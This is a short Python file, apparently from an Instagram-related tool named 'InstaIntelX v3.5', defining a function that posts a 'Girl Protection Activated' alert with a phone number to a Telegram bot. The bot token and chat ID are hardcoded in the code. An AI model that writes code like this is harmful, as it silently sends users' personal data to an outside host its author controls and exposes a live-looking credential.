# 🛡️ InstaIntelX v3.5
# Developed by: Mohammed
# GitHub: https://github.com/YOUR_USERNAME

import requests

def send_telegram_alert(phone="غير معروف"):
    TOKEN = '7864974262:AAF1-hLkW3AOKJySXDFcRO_XoYtKchW2uQw'
    CHAT_ID = '6332164785'

    message = f"""🚨 Girl Protection Activated

✅ Someone entered Girl Protection Mode
📱 Phone: {phone}
📡 Tool: InstaIntelX v3.5
"""

    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        'chat_id': CHAT_ID,
        'text': message
    }

    try:
        requests.post(url, data=payload)
    except Exception as e:
        print("⚠️ Failed to send Telegram alert:", e)
